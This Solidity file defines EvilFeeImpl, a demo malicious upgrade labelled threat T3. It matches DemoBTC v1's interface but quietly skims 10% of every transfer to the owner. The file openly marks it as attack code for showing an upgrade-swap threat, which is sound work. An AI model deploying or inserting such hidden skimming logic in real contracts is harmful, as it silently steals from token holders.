// SPDX-License-Identifier: MIT
pragma solidity 0.8.37;

import {DemoBTC} from "../DemoBTC.sol";

/// @title EvilFeeImpl (demo attack, threat T3)
/// @notice Exactly the same selectors as DemoBTC v1, but every transfer silently skims 10% to owner().
/// @dev Deliberately malicious demo code. Never deploy outside a demo.
contract EvilFeeImpl is DemoBTC {
    function _update(address from, address to, uint256 value) internal override {
        if (from != address(0) && to != address(0)) {
            uint256 fee = value / 10;
            if (fee != 0) {
                super._update(from, owner(), fee);
                value -= fee;
            }
        }
        super._update(from, to, value);
    }
}
